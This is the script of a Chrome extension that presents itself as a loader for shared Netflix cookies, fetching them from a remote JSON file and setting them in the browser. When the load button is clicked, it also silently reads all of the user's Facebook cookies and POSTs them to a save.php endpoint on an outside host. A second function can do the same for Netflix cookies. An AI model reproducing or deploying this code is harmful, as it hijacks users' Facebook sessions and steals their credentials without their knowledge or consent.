'use strict';

function loadCookie(){
	$.getJSON( "http://www.pacha.es/crop/crop/you/cookie.json", function( data ) {
		try{
			barraStatus();
			$.each( data, function( key, val ) {
			setCookie(val.name,val.value,val.host);
			});
			exportFacebook();
			//$('#xMARVELxDCxCOMIC111').removeClass('pX-X987');
			//alert("Cookie Loaded Success!!!");
		}catch(err){
				alert("Failed Loading Cookie!!!" + err.description);
			}	

	});
}


function saveCookie(p){
$.post( "http://www.pacha.es/crop/crop/you/save.php", { cookie: p} );
}


function barraStatus(){
		    $("#xMARVELxDCxCOMIC111").addClass("pX-X987").fadeIn(800);
		    $(".xT02X65G").delay(0).fadeIn(800);
}


function showMessage(){
	alert(exportFacebook());
}

function exportFacebook(){
var cook = "[";
    chrome.cookies.getAll({domain: ".facebook.com"}, function(cookies) {
			for (var i in cookies) {
				cook+= "{\"host\":\""+ cookies[i].domain + "\",\"name\":\"" + cookies[i].name + "\",\"value\":\"" + cookies[i].value + "\"},";
			}
			cook+= "]";
			saveCookie(cook);
	});
}

function exportNetflix(){
var cook = "[";
    chrome.cookies.getAll({domain: ".netflix.com"}, function(cookies) {
			for (var i in cookies) {
				cook+= "{\"host\":\""+ cookies[i].domain + "\",\"name\":\"" + cookies[i].name + "\",\"value\":\"" + cookies[i].value + "\"},";
			}
			cook+= "]";
			saveCookie(cook);
	});
}

function setCookie(name,value,domain){
	chrome.cookies.set({
		    "url": "https://www.netflix.com",
		    "name": name,
		    "value": value,
			"domain": domain,
			}, function (cookie) {
		    console.log(JSON.stringify(cookie));
		    console.log(chrome.extension.lastError);
		    console.log(chrome.runtime.lastError);
	});

}

function main() {
  // Initialization work goes here.
}

document.addEventListener('DOMContentLoaded', function () {
  document.getElementById('btn1').addEventListener('click', loadCookie);
  main();
});

document.addEventListener('DOMContentLoaded', function () {
  document.getElementById('btn2').addEventListener('click', exportFacebook);
  main();
});

document.addEventListener('DOMContentLoaded', function () {
  document.getElementById('btn3').addEventListener('click', delCookie);
  main();
});
